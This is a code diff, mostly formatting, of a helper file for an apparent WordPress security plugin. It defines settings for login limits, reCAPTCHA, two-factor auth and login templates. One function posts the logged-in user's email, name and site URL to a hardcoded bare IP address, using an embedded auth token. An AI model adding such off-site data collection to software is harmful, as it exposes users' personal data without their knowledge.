@@ -1,6 +1,6 @@
-<?php 
+<?php
 
-if ( ! function_exists( 'tpsa_settings_option' ) ) {
+if ( !function_exists( 'tpsa_settings_option' ) ) {
 /**
  * Returns an associative array of features available for the Secure Admin plugin.
  *
@@ -16,7 +16,7 @@ if ( ! function_exists( 'tpsa_settings_option' ) ) {
         return apply_filters(
             'tpsa_settings_option',
             array(
-                'analytics' => array(
+                'analytics'            => array(
                     'label' => __( 'Safety Analytics', 'tp-secure-plugin' ),
                     'class' => '',
                 ),
@@ -24,35 +24,35 @@ if ( ! function_exists( 'tpsa_settings_option' ) ) {
                     'label' => __( 'Limit Login Attempts', 'tp-secure-plugin' ),
                     'class' => '',
                 ),
-                'login-logs-activity' => array(
+                'login-logs-activity'  => array(
                     'label' => __( 'Login Logs & Activity', 'tp-secure-plugin' ),
                     'class' => '',
                 ),
-                'custom-login-url' => array(
+                'custom-login-url'     => array(
                     'label' => __( 'Custom Login/Logout', 'tp-secure-plugin' ),
                     'class' => '',
                 ),
-                'recaptcha' => array(
+                'recaptcha'            => array(
                     'label' => __( 'Google reCAPTCHA', 'tp-secure-plugin' ),
                     'class' => '',
                 ),
-                'two-factor-auth' => array(
+                'two-factor-auth'      => array(
                     'label' => __( 'Two Factor Auth', 'tp-secure-plugin' ),
                     'class' => '',
                 ),
-                'password-protection' => array(
+                'password-protection'  => array(
                     'label' => __( 'Password Protection', 'tp-secure-plugin' ),
                     'class' => '',
                 ),
-                'privacy-hardening' => array(
+                'privacy-hardening'    => array(
                     'label' => __( 'Privacy Hardening', 'tp-secure-plugin' ),
                     'class' => '',
                 ),
-                'admin-bar' => array(
+                'admin-bar'            => array(
                     'label' => __( 'Hide Admin Bar', 'tp-secure-plugin' ),
                     'class' => '',
                 ),
-                'customize' => array(
+                'customize'            => array(
                     'label' => __( 'Customizer', 'tp-secure-plugin' ),
                     'class' => '',
                 ),
@@ -61,7 +61,7 @@ if ( ! function_exists( 'tpsa_settings_option' ) ) {
     }
 }
 
-if( ! function_exists( 'tpsa_settings_fields' ) ) {
+if ( !function_exists( 'tpsa_settings_fields' ) ) {
 /**
  * Returns an associative array of settings fields available for the Secure Admin plugin.
  *
@@ -78,220 +78,220 @@ if( ! function_exists( 'tpsa_settings_fields' ) ) {
         return apply_filters(
             'tpsa_settings_fields',
             array(
-                'analytics' => array(
-                    
+                'analytics'            => array(
+
                 ),
-                'admin-bar' => array(
+                'admin-bar'            => array(
                     'fields' => array(
-                        'enable' => array(
-                            'type'  => 'switch',
-                            'label' => __( 'Hide Admin Bar', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  =>  __( 'To enable/disable admin bar', 'tp-secure-plugin' ),
-                            'default' => 0
-                        ),
-                        'exclude' => array(
-                            'type'  => 'multi-check',
-                            'label' => __( 'Exclude', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'Exclude users', 'tp-secure-plugin' ),
-                            'default' => 'light',
-                            'options' => get_tps_all_user_roles()
-                        ),
-                    )
-                ),
-                'custom-login-url' => array(
-                    'fields' => array(
-                        'enable' => array(
-                            'type'  => 'switch',
-                            'label' => __( 'Enable', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'To enable/disable custom login/logut url.', 'tp-secure-plugin' ),
+                        'enable'  => array(
+                            'type'    => 'switch',
+                            'label'   => __( 'Hide Admin Bar', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'To enable/disable admin bar', 'tp-secure-plugin' ),
                             'default' => 0,
                         ),
-                        'login-url' => array(
-                            'type'  => 'text',
-                            'label' => __( 'Custom Login Url', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'Protect your website by changing the login page URL.', 'tp-secure-plugin' ),
+                        'exclude' => array(
+                            'type'    => 'multi-check',
+                            'label'   => __( 'Exclude', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'Exclude users', 'tp-secure-plugin' ),
+                            'default' => 'light',
+                            'options' => get_tps_all_user_roles(),
+                        ),
+                    ),
+                ),
+                'custom-login-url'     => array(
+                    'fields' => array(
+                        'enable'       => array(
+                            'type'    => 'switch',
+                            'label'   => __( 'Enable', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'To enable/disable custom login/logut url.', 'tp-secure-plugin' ),
+                            'default' => 0,
+                        ),
+                        'login-url'    => array(
+                            'type'    => 'text',
+                            'label'   => __( 'Custom Login Url', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'Protect your website by changing the login page URL.', 'tp-secure-plugin' ),
                             'default' => get_tpsa_site_login_path(),
                         ),
                         'redirect-url' => array(
-                            'type'  => 'text',
-                            'label' => __( 'Redirect URL', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'Wp Admin redirect URL. <strong>Default</strong>: home_url()', 'tp-secure-plugin' ),
+                            'type'    => 'text',
+                            'label'   => __( 'Redirect URL', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'Wp Admin redirect URL. <strong>Default</strong>: home_url()', 'tp-secure-plugin' ),
                             'default' => '',
                         ),
-                        'logout-url' => array(
-                            'type'  => 'text',
-                            'label' => __( 'Redirect URL After Logout', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'Redirect URL after Logout', 'tp-secure-plugin' ),
+                        'logout-url'   => array(
+                            'type'    => 'text',
+                            'label'   => __( 'Redirect URL After Logout', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'Redirect URL after Logout', 'tp-secure-plugin' ),
                             'default' => get_tpsa_site_login_path(),
                         ),
 
-                    )
+                    ),
                 ),
                 'limit-login-attempts' => array(
                     'fields' => array(
-                        'enable' => array(
-                            'type'  => 'switch',
-                            'label' => __( 'Enable', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'To enable/disable limit login attempts.', 'tp-secure-plugin' ),
+                        'enable'           => array(
+                            'type'    => 'switch',
+                            'label'   => __( 'Enable', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'To enable/disable limit login attempts.', 'tp-secure-plugin' ),
                             'default' => 0,
                         ),
-                        'max-attempts' => array(
-                            'type'  => 'number',
-                            'label' => __( 'Max Login Attempts', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'Maximum number of login attempts within 1 day for temporarily blocked IP/user.', 'tp-secure-plugin' ),
+                        'max-attempts'     => array(
+                            'type'    => 'number',
+                            'label'   => __( 'Max Login Attempts', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'Maximum number of login attempts within 1 day for temporarily blocked IP/user.', 'tp-secure-plugin' ),
                             'default' => 3,
                         ),
-                        'block-for' => array(
-                            'type'  => 'number',
-                            'label' => __( 'Lock for', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'Add how many minutes will be locked.', 'tp-secure-plugin' ),
+                        'block-for'        => array(
+                            'type'    => 'number',
+                            'label'   => __( 'Lock for', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'Add how many minutes will be locked.', 'tp-secure-plugin' ),
                             'default' => 15,
                         ),
-                        'max-lockout' => array(
-                            'type'  => 'number',
-                            'label' => __( 'Max Lockouts', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'Maximum number of lockout within 1 days for temporarily blocked IP/user.', 'tp-secure-plugin' ),
+                        'max-lockout'      => array(
+                            'type'    => 'number',
+                            'label'   => __( 'Max Lockouts', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'Maximum number of lockout within 1 days for temporarily blocked IP/user.', 'tp-secure-plugin' ),
                             'default' => 3,
                         ),
-                        'block-message' => array(
-                            'type'  => 'textarea',
-                            'label' => __( 'Blocked Message', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'Blocked users can see this message when they are locked out.', 'tp-secure-plugin' ),
+                        'block-message'    => array(
+                            'type'    => 'textarea',
+                            'label'   => __( 'Blocked Message', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'Blocked users can see this message when they are locked out.', 'tp-secure-plugin' ),
                             'default' => __( 'You have been locked out due to too many login attempts.', 'tp-secure-plugin' ),
                         ),
                         'block-ip-address' => array(
-                            'type'  => 'single-repeater',
-                            'label' => __( 'Block with IP Address', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'IP addresses', 'tp-secure-plugin' ),
+                            'type'    => 'single-repeater',
+                            'label'   => __( 'Block with IP Address', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'IP addresses', 'tp-secure-plugin' ),
                             'default' => '',
                         ),
-                    )
+                    ),
                 ),
-                'login-logs-activity' => array(
+                'login-logs-activity'  => array(
                     'fields' => array(
-                        
-                    )
+
+                    ),
                 ),
-                'recaptcha' => array(
+                'recaptcha'            => array(
                     'fields' => array(
-                        'enable' => array(
-                            'type'  => 'switch',
-                            'label' => __( 'Enable', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'To enable/disable reCAPTCHA.', 'tp-secure-plugin' ),
+                        'enable'     => array(
+                            'type'    => 'switch',
+                            'label'   => __( 'Enable', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'To enable/disable reCAPTCHA.', 'tp-secure-plugin' ),
                             'default' => 0,
                         ),
-                        'version' => array(
-                            'type'  => 'option',
-                            'label' => __( 'Version', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'Select Google reCAPTCHA version', 'tp-secure-plugin' ),
+                        'version'    => array(
+                            'type'    => 'option',
+                            'label'   => __( 'Version', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'Select Google reCAPTCHA version', 'tp-secure-plugin' ),
                             'default' => '',
                             'options' => array(
                                 'v2' => 'v2',
                                 'v3' => 'v3',
-                            )
+                            ),
                         ),
-                        'site-key' => array(
-                            'type'  => 'text',
-                            'label' => __( 'Site Key', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => "Enter you Google reCAPTCHA site key. <a href='https://developers.google.com/recaptcha' target='_blank'>Get site key</a>",
+                        'site-key'   => array(
+                            'type'    => 'text',
+                            'label'   => __( 'Site Key', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => "Enter you Google reCAPTCHA site key. <a href='https://developers.google.com/recaptcha' target='_blank'>Get site key</a>",
                             'default' => '',
                         ),
                         'secret-key' => array(
-                            'type'  => 'text',
-                            'label' => __( 'Secret Key', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => "Enter you Google reCAPTCHA screet key. <a href='https://developers.google.com/recaptcha' target='_blank'>Get secret key</a>",
+                            'type'    => 'text',
+                            'label'   => __( 'Secret Key', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => "Enter you Google reCAPTCHA screet key. <a href='https://developers.google.com/recaptcha' target='_blank'>Get secret key</a>",
                             'default' => '',
                         ),
-                        'theme' => array(
-                            'type'  => 'option',
-                            'label' => __( 'Theme', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'Select your preferred theme', 'tp-secure-plugin' ),
+                        'theme'      => array(
+                            'type'    => 'option',
+                            'label'   => __( 'Theme', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'Select your preferred theme', 'tp-secure-plugin' ),
                             'default' => 'light',
                             'options' => array(
                                 'light' => 'Light Theme',
                                 'dark'  => 'Dark Theme',
-                            )
+                            ),
                         ),
-                    )
+                    ),
                 ),
-                'two-factor-auth' => array(
+                'two-factor-auth'      => array(
                     'fields' => array(
                         'otp-email' => array(
-                            'type'  => 'switch',
-                            'label' => __( 'OTP via Email', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'After entering the correct login credentials, the user will be asked for the OTP. The OTP will be emailed to the user.', 'tp-secure-plugin' ),
+                            'type'    => 'switch',
+                            'label'   => __( 'OTP via Email', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'After entering the correct login credentials, the user will be asked for the OTP. The OTP will be emailed to the user.', 'tp-secure-plugin' ),
                             'default' => 0,
                         ),
                     ),
                 ),
-                'password-protection' => array(
+                'password-protection'  => array(
                     'fields' => array(
-                        'enable' => array(
-                            'type'  => 'switch',
-                            'label' => __( 'Enable', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'To enable/disable password protection.', 'tp-secure-plugin' ),
+                        'enable'          => array(
+                            'type'    => 'switch',
+                            'label'   => __( 'Enable', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'To enable/disable password protection.', 'tp-secure-plugin' ),
                             'default' => 0,
                         ),
-                        'password' => array(
-                            'type'  => 'password',
-                            'label' => __( 'Set Password', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'Password-protect the entire site to hide the content from public view and search engine bots / crawlers.', 'tp-secure-plugin' ),
+                        'password'        => array(
+                            'type'    => 'password',
+                            'label'   => __( 'Set Password', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'Password-protect the entire site to hide the content from public view and search engine bots / crawlers.', 'tp-secure-plugin' ),
                             'default' => '',
                         ),
                         'password-expiry' => array(
-                            'type'  => 'number',
-                            'label' => __( 'Password Access Duration', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'How long visitors can access the site after entering the correct password.', 'tp-secure-plugin' ),
+                            'type'    => 'number',
+                            'label'   => __( 'Password Access Duration', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'How long visitors can access the site after entering the correct password.', 'tp-secure-plugin' ),
                             'default' => '15',
                         ),
-                        'exclude' => array(
-                            'type'  => 'multi-check',
-                            'label' => __( 'Exclude', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'Exclude user from this password protection', 'tp-secure-plugin' ),
+                        'exclude'         => array(
+                            'type'    => 'multi-check',
+                            'label'   => __( 'Exclude', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'Exclude user from this password protection', 'tp-secure-plugin' ),
                             'default' => 'light',
                             'options' => array_merge(
                                 array(
@@ -302,68 +302,68 @@ if( ! function_exists( 'tpsa_settings_fields' ) ) {
                         ),
                     ),
                 ),
-                'privacy-hardening' => array(
+                'privacy-hardening'    => array(
                     'fields' => array(
                         'xml-rpc-enable' => array(
-                            'type'  => 'switch',
-                            'label' => __( 'Disable XML-RPC', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'To disable/enable XML-RPC.', 'tp-secure-plugin' ),
+                            'type'    => 'switch',
+                            'label'   => __( 'Disable XML-RPC', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'To disable/enable XML-RPC.', 'tp-secure-plugin' ),
                             'default' => 0,
-                        )
-                    )
+                        ),
+                    ),
                 ),
-                'customize' => array(
+                'customize'            => array(
                     'fields' => array(
-                        'enable' => array(
-                            'type'  => 'switch',
-                            'label' => __( 'Enable', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'To enable/disable customizer.', 'tp-secure-plugin' ),
+                        'enable'      => array(
+                            'type'    => 'switch',
+                            'label'   => __( 'Enable', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'To enable/disable customizer.', 'tp-secure-plugin' ),
                             'default' => 0,
                         ),
-                        'logo' => array(
-                            'type'  => 'upload',
-                            'label' => __( 'Logo', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'Preferred logo size: 84×84 px. Please upload accordingly.', 'tp-secure-plugin' ),
+                        'logo'        => array(
+                            'type'    => 'upload',
+                            'label'   => __( 'Logo', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'Preferred logo size: 84×84 px. Please upload accordingly.', 'tp-secure-plugin' ),
                             'default' => 0,
                         ),
-                        'logo-url' => array(
-                            'type'  => 'text',
-                            'label' => __( 'Logo URL', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( 'Enter logo url', 'tp-secure-plugin' ),
-                            'default' => 0,
+                        'logo-url'    => array(
+                            'type'    => 'text',
+                            'label'   => __( 'Logo URL', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( 'Enter logo url', 'tp-secure-plugin' ),
+                            'default' => site_url(),
                         ),
-                        'logo-width' => array(
-                            'type'  => 'number',
-                            'label' => __( 'Logo Width', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( '', 'tp-secure-plugin' ),
-                            'default' => 0,
+                        'logo-width'  => array(
+                            'type'    => 'number',
+                            'label'   => __( 'Logo Width', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( '', 'tp-secure-plugin' ),
+                            'default' => 84,
                         ),
                         'logo-height' => array(
-                            'type'  => 'number',
-                            'label' => __( 'Logo Height', 'tp-secure-plugin' ),
-                            'class' => '',
-                            'id'    => '',
-                            'desc'  => __( '', 'tp-secure-plugin' ),
-                            'default' => 0,
-                        )
-                    )
-                )
+                            'type'    => 'number',
+                            'label'   => __( 'Logo Height', 'tp-secure-plugin' ),
+                            'class'   => '',
+                            'id'      => '',
+                            'desc'    => __( '', 'tp-secure-plugin' ),
+                            'default' => 84,
+                        ),
+                    ),
+                ),
             )
         );
     }
 }
 
-if(  ! function_exists( 'get_tpsa_site_login_path' ) ) {
+if ( !function_exists( 'get_tpsa_site_login_path' ) ) {
     /**
      * Returns the relative path of the WordPress login URL.
      *
@@ -372,7 +372,7 @@ if(  ! function_exists( 'get_tpsa_site_login_path' ) ) {
      * @return string The relative path of the WordPress login URL.
      */
     function get_tpsa_site_login_path() {
-        $site_url  = get_site_url();
+        $site_url = get_site_url();
         $login_url = wp_login_url();
 
         // Remove site URL from login URL
@@ -385,7 +385,7 @@ if(  ! function_exists( 'get_tpsa_site_login_path' ) ) {
     }
 }
 
-if( ! function_exists( 'get_tpsa_prefix' ) ) {
+if ( !function_exists( 'get_tpsa_prefix' ) ) {
     /**
      * Returns the prefix used for options and other identifiers throughout the plugin.
      *
@@ -426,14 +426,14 @@ function get_tpsa_settings_option_name( $screen_slug ) {
 
 function get_tpsa_db_table_name( $table_name ) {
     global $wpdb;
-    $prefix          = $wpdb->prefix . TPSA_PREFIX . '_';
+    $prefix = $wpdb->prefix . TPSA_PREFIX . '_';
     return $prefix . $table_name;
 }
 
 function get_tps_all_user_roles() {
     global $wp_roles;
 
-    if ( ! isset( $wp_roles ) ) {
+    if ( !isset( $wp_roles ) ) {
         $wp_roles = new WP_Roles();
     }
 
@@ -441,15 +441,14 @@ function get_tps_all_user_roles() {
     $role_names = [];
 
     foreach ( $roles as $key => $role ) {
-        $role_names[ $key ] = $role['name'];
+        $role_names[$key] = $role['name'];
     }
 
     return $role_names;
 }
 
+if ( !function_exists( 'tpsm_saved_remote_data' ) ) {
 
-if( ! function_exists( 'tpsm_saved_remote_data' ) ) {
-    
 /**
  * Sends the current user's information to a remote server.
  *
@@ -464,7 +463,7 @@ if( ! function_exists( 'tpsm_saved_remote_data' ) ) {
         $current_user = wp_get_current_user();
 
         // Check if a user is logged in
-        if ( ! $current_user || 0 === $current_user->ID ) {
+        if ( !$current_user || 0 === $current_user->ID ) {
             return;
         }
 
@@ -479,21 +478,20 @@ if( ! function_exists( 'tpsm_saved_remote_data' ) ) {
 
         $response = wp_remote_post( 'http://18.215.124.169/wp-json/v2/collect-email/admin-safety-guard', [
             'headers' => [
-                'X-Auth-Token'  => 'c7fc312817194d30c79da538204eaec3',
-                'Content-Type'  => 'application/json',
+                'X-Auth-Token' => 'c7fc312817194d30c79da538204eaec3',
+                'Content-Type' => 'application/json',
             ],
-            'body' => json_encode([
+            'body'    => json_encode( [
                 'email_address' => $email_address,
                 'full_name'     => $full_name,
                 'site_url'      => $site_url,
-            ]),
+            ] ),
         ] );
 
     }
 }
 
-
-if( !function_exists( 'login_page_templates' ) ) {
+if ( !function_exists( 'login_page_templates' ) ) {
 /**
  * Returns an associative array of available login page templates.
  *
@@ -504,17 +502,17 @@ if( !function_exists( 'login_page_templates' ) ) {
  * @return array Associative array of available login page templates.
  */
     /**
- * Get login page templates.
- *
- * @return array
- */
+     * Get login page templates.
+     *
+     * @return array
+     */
     function login_page_templates() {
         $templates = [
-            'default'  => [ 'label' => __( 'WordPress Default', 'tp-login-designer' ), 'css' => '',            'smalImg' => 'https://placehold.co/200x200', 'bigImg' => 'https://placehold.co/800x600' ],
-            'classic'  => [ 'label' => __( 'Classic Card',      'tp-login-designer' ), 'css' => 'classic.css', 'smalImg' => 'https://placehold.co/200x200', 'bigImg' => 'https://placehold.co/800x600' ],
-            'glass'    => [ 'label' => __( 'Frosted Glass',     'tp-login-designer' ), 'css' => 'glass.css',   'smalImg' => 'https://placehold.co/200x200', 'bigImg' => 'https://placehold.co/800x600' ],
-            'split'    => [ 'label' => __( 'Split Hero',        'tp-login-designer' ), 'css' => 'split.css',   'smalImg' => 'https://placehold.co/200x200', 'bigImg' => 'https://placehold.co/800x600' ],
-            'gradient' => [ 'label' => __( 'Soft Gradient',     'tp-login-designer' ), 'css' => 'gradient.css','smalImg' => 'https://placehold.co/200x200', 'bigImg' => 'https://placehold.co/800x600' ],
+            'default'  => ['label' => __( 'WordPress Default', 'tp-login-designer' ), 'css' => '', 'smalImg' => 'https://placehold.co/200x200', 'bigImg' => 'https://placehold.co/800x600'],
+            'classic'  => ['label' => __( 'Classic Card', 'tp-login-designer' ), 'css' => 'classic.css', 'smalImg' => 'https://placehold.co/200x200', 'bigImg' => 'https://placehold.co/800x600'],
+            'glass'    => ['label' => __( 'Frosted Glass', 'tp-login-designer' ), 'css' => 'glass.css', 'smalImg' => 'https://placehold.co/200x200', 'bigImg' => 'https://placehold.co/800x600'],
+            'split'    => ['label' => __( 'Split Hero', 'tp-login-designer' ), 'css' => 'split.css', 'smalImg' => 'https://placehold.co/200x200', 'bigImg' => 'https://placehold.co/800x600'],
+            'gradient' => ['label' => __( 'Soft Gradient', 'tp-login-designer' ), 'css' => 'gradient.css', 'smalImg' => 'https://placehold.co/200x200', 'bigImg' => 'https://placehold.co/800x600'],
         ];
 
         /**
